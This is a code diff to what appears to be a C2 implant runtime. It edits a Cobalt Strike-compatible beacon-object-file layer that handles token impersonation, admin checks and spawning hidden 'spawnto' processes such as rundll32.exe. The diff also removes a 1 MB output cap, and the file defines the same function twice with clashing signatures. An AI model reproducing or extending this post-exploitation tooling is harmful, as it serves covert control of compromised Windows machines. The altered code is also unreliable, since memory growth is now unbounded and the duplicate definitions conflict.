@@ -22,9 +22,6 @@
 #include "../../include/coff/COFFSetup.h"
 #include "../../include/pandragon_runtime.h"
 
-//#define DEFAULTPROCESSNAME "rundll32.exe" // TODO: add to config.
-//                                             update: we added it to config!!!!!!!!!!!!!
-
 #ifdef _WIN64
     #define X86PATH "SysWOW64"
     #define X64PATH "System32"
@@ -152,10 +149,10 @@ uint32_t swap_endianess(uint32_t indata) {
 }
 #endif
 
+int beacon_compatibility_capacity = 0;
 char* beacon_compatibility_output = NULL;
 int beacon_compatibility_size = 0;
 int beacon_compatibility_offset = 0;
-int beacon_compatibility_capacity = 0;  /* allocated capacity to avoid O(n²) realloc */
 
 void BeaconDataParse(datap* parser, char* buffer, int size) {
     if (parser == NULL || buffer == NULL) {
@@ -331,22 +328,14 @@ void BeaconFormatInt(formatp* format, int value) {
 
 /* Main output functions */
 
-// Maximum BOF output size to prevent unbounded memory growth (1MB)
-#define MAX_BOF_OUTPUT_SIZE (1024 * 1024)
-
 /**
  * Ensure at least `needed` bytes of free space in the output buffer.
  * Grows capacity geometrically (1.5x) to avoid O(n²) realloc churn.
- * Returns true on success, false on OOM or max size exceeded.
+ * Returns true on success, false on OOM.
  */
 static bool ensure_capacity(int required_total) {
     if (beacon_compatibility_capacity >= required_total) {
         return true;
-    }
-
-    // Cap at MAX_BOF_OUTPUT_SIZE
-    if (required_total > MAX_BOF_OUTPUT_SIZE) {
-        return false;
     }
 
     // Grow: max(1.5x old capacity, required_total)
@@ -356,9 +345,6 @@ static bool ensure_capacity(int required_total) {
     }
     while (new_cap < required_total) {
         new_cap = new_cap + (new_cap >> 1);  /* 1.5x growth */
-    }
-    if (new_cap > MAX_BOF_OUTPUT_SIZE) {
-        new_cap = MAX_BOF_OUTPUT_SIZE;
     }
 
     char* newBuf = (char*)__malloc(new_cap);
@@ -436,11 +422,11 @@ void BeaconOutput(int type, char* data, int len) {
 
 /* Token Functions */
 
-BOOL BeaconUseToken(HANDLE token) {
+bool BeaconUseToken(HANDLE token) {
     /* Probably needs to handle DuplicateTokenEx too.
     Works as of now because NULL = -2 = NtCurrentThread. */
     __SetThreadToken(NULL, token);
-    return TRUE;
+    return true;
 }
 
 void BeaconRevertToken(void) {
@@ -452,18 +438,18 @@ void BeaconRevertToken(void) {
     return;
 }
 
-BOOL BeaconIsAdmin(void) {
+bool BeaconIsAdmin(void) {
 
     if (!g_functionTable->OpenProcessToken || !g_functionTable->GetTokenInformation) {
-        return FALSE;
+        return false;
     }
 
     HANDLE hToken = NULL;
     if (!g_functionTable->OpenProcessToken((HANDLE)-1, TOKEN_QUERY, &hToken)) {
-        return FALSE;
+        return false;
     }
 
-    BOOL isAdmin = FALSE;
+    bool isAdmin = false;
 
     /*
      * Primary path: TokenElevation (Vista+, fast, no SID math)
@@ -495,19 +481,19 @@ BOOL BeaconIsAdmin(void) {
     g_functionTable->GetTokenInformation(hToken, TokenGroups, NULL, 0, &dwSize);
     if (dwSize == 0) {
         g_functionTable->NtClose(hToken);
-        return FALSE;
+        return false;
     }
 
     TOKEN_GROUPS* pGroups = (TOKEN_GROUPS*)__malloc(dwSize);
     if (!pGroups) {
         g_functionTable->NtClose(hToken);
-        return FALSE;
+        return false;
     }
 
     if (!g_functionTable->GetTokenInformation(hToken, TokenGroups, pGroups, dwSize, &dwSize)) {
         __free(pGroups);
         g_functionTable->NtClose(hToken);
-        return FALSE;
+        return false;
     }
 
     g_functionTable->NtClose(hToken);
@@ -549,7 +535,7 @@ BOOL BeaconIsAdmin(void) {
          */
         DWORD* pSubAuth = (DWORD*)(pSidBytes + 8);
         if (pSubAuth[0] == 32 && pSubAuth[1] == 544) {
-            isAdmin = TRUE;
+            isAdmin = true;
             break;
         }
     }
@@ -590,13 +576,12 @@ void BeaconGetSpawnTo(bool x86, char* buffer, int length) {
     return;
 }
 
-BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO * sInfo, PROCESS_INFORMATION * pInfo) {
-    (void)ignoreToken;  // Unused
+bool BeaconSpawnTemporaryProcess(bool x86, bool ignoreToken, STARTUPINFO * sInfo, PROCESS_INFORMATION * pInfo) {
+    (void)ignoreToken;
 
-    BOOL bSuccess = FALSE;
+    bool bSuccess = false;
     const char* spawntoPath = NULL;
 
-    // Use config if available
     if (g_beaconConfig != NULL) {
         if (x86 && g_beaconConfig->spawnto_x86_len > 0) {
             spawntoPath = g_beaconConfig->spawnto_x86;
@@ -605,19 +590,7 @@ BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO * sInfo
         }
     }
 
-    // Fallback to defaults.... or don't
-    // see, we are kinda guaranteed to have a default name emitted by config.
-    // unless the config is malformed. in which case well i am sorry idk what to say
-    //if (spawntoPath == NULL) {
-    //    if (x86) {
-    //        spawntoPath = "C:\\Windows\\" X86PATH "\\" DEFAULTPROCESSNAME;
-    //    } else {
-    //        spawntoPath = "C:\\Windows\\" X64PATH "\\" DEFAULTPROCESSNAME;
-    //    }
-    //}
-
-    bSuccess = g_functionTable->CreateProcessA(NULL, (char*)spawntoPath, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
-    // Maybe we should check if we have unhook enabled and if so, resolve createprocess from the unhooked kernel32 lol. TODO
+    bSuccess = g_functionTable->CreateProcessA(NULL, (char*)spawntoPath, NULL, NULL, true, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
     return bSuccess;
 }
 
@@ -750,12 +723,11 @@ char* BeaconGetOutputData(int *outsize) {
 
 /* Spawn+Inject Functions - Stubs for CS BOF compatibility */
 
-BOOL BeaconSpawnTemporaryProcess(bool x86, bool ignoreToken, STARTUPINFOW * sInfo, PROCESS_INFORMATION * pInfo) {
-    if (!sInfo || !pInfo || !g_functionTable) return FALSE;
-    
+bool BeaconSpawnTemporaryProcess(bool x86, bool ignoreToken, STARTUPINFOW * sInfo, PROCESS_INFORMATION * pInfo) {
+    if (!sInfo || !pInfo || !g_functionTable) return false;
+
     const char* spawntoPath = NULL;
 
-    // Use config if available
     if (g_beaconConfig != NULL) {
         if (x86 && g_beaconConfig->spawnto_x86_len > 0) {
             spawntoPath = g_beaconConfig->spawnto_x86;
@@ -764,31 +736,30 @@ BOOL BeaconSpawnTemporaryProcess(bool x86, bool ignoreToken, STARTUPINFOW * sInf
         }
     }
 
-    // Fallback: cannot proceed without config (should never happen)
     if (spawntoPath == NULL) {
-        return FALSE;
+        return false;
     }
 
     wchar_t wcmd[MAX_PATH];
-    if (__mbstowcs(wcmd, spawntoPath, MAX_PATH) == (size_t)-1) return FALSE;
-    
+    if (__mbstowcs(wcmd, spawntoPath, MAX_PATH) == (size_t)-1) return false;
+
     __memset(sInfo, 0, sizeof(STARTUPINFOW));
     sInfo->cb = sizeof(STARTUPINFOW);
     sInfo->dwFlags = STARTF_USESTDHANDLES;
-    
+
     HANDLE hToken = NULL;
     if (!ignoreToken) {
         if (g_functionTable->OpenProcessToken) {
             g_functionTable->OpenProcessToken((HANDLE)-1, TOKEN_ALL_ACCESS, &hToken);
         }
     }
-    
-    BOOL success = FALSE;
+
+    bool success = false;
     if (g_functionTable->CreateProcessW) {
-        success = g_functionTable->CreateProcessW(wcmd, NULL, NULL, NULL, ignoreToken ? FALSE : TRUE,
+        success = g_functionTable->CreateProcessW(wcmd, NULL, NULL, NULL, ignoreToken ? false : true,
                                   CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
     }
-    
+
     if (hToken && g_functionTable->NtClose) {
         g_functionTable->NtClose(hToken);
     }
